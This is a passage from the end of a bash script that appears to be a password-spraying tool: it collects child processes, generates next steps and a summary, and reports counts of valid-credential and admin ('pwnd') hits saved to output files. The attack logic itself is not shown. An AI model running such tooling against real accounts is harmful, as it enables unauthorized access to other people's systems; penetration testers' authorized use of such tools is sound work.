            wait "$pid" 2>/dev/null || true
        done
        CHILD_PIDS=()
    fi

    #--- Generate next steps and summary ---------------------------------------
    generate_next_steps
    generate_summary

    echo ""
    local total_hits
    total_hits=$(wc -l < "${OUTDIR}/hits.txt" 2>/dev/null || echo 0)
    local total_pwnd
    total_pwnd=$(wc -l < "${OUTDIR}/pwnd.txt" 2>/dev/null || echo 0)

    if (( total_hits > 0 )); then
        success "Spray complete — ${total_hits} hit(s), ${total_pwnd} admin hit(s)"
        success "Results: ${OUTDIR}/hits.txt"
        [[ "$total_pwnd" -gt 0 ]] && success "Admin hits: ${OUTDIR}/pwnd.txt"
    else
        warn "Spray complete — no valid credentials found"
    fi
}

main "$@"
